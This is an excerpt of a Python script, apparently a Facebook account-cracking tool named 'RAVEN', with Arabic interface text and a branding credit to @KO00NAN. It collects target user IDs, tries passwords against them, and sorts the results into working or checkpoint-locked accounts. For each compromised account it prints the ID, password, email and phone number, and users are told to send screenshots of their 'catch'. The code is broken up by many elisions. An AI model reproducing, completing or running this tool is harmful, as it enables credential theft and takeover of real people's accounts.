...
g= datetime.datetime(2023, 11, 13, 7, 10 ,9)
...
# if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   # if(x.strftime("%X"))>(g.strftime("%X")):
    # print('\n\n')
    # print("     "+'خلص اشتراك عليك مراجعة صانعة اداة @KO00NAN  ☄️🗿')
    # print('\n\n')
    # print(x)
...
tlg1 = '\n————————————\n• DeCoDe By @KO00NAN •————————————\n ⋯⋯⋯⋯⋯⋯⋯⧏ RAVEN ⧐⋯⋯⋯⋯⋯⋯⋯\n𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃  ➩ \nتم تشغيل الاداة\n    \nلا تـنسى ان تـرسل صـور الـصيد -  @MPMPK\n\n⋯⋯⋯⋯⋯⋯⋯⧏ RAVEN ⧐⋯⋯⋯⋯⋯⋯⋯ '
...
def main():
	...
	gh = 'h'
	wel='# 1 -                                  صيد من الاصدقاء                           0 - تسجيل خروج'
	cik2=mark(wel ,style='bold yellow')
	sol().print(cik2)
	print('')
	_____alvino__adijaya_____ = input(f'{u} [=] ماذا ستختار : ')
...
def dump_massal():
	...
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'- {N} حط الايدي '+str(bilangan)+f' : ')
		#print(f'')
		uid.append(Masukan)
	for user in uid:
	    try:
	      ...
	      pass
	        ...
	        exit()
	try:
	      op = f"[{H}={N}] {K} مجموع الايديات{H} : "+str(len(id))
	      print('')
	      print(op)
	      setting() 
	except Exception as e:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [KONAN] %s/%s || OK - %s || CP - %s || %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'''⪧ ❲ CP ❳ كونان جابلك حساب قافل
...
ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ
 @KO00NAN	صور الصيد هون				
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'''⪧ ❲ OK ❳ كونان جابلك حساب شغال 
ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ
...
@KO00NAN صور الصيد هون					
					...
					infoakun += f'''⪧ ❲ OK ❳ كونان جابلك حساب شغال 
⥁────────────────────⥀
◆ - ID : {idf}\n◆ - PASSWORD : {pw}\n⥁────────────────────⥀\n◆ - The Email : {email}\n◆ - Date : {tahun}\n◆ - The Nomber : {nomer}\n⥁────────────────────⥀\n
◆ - @KO00NAN '''
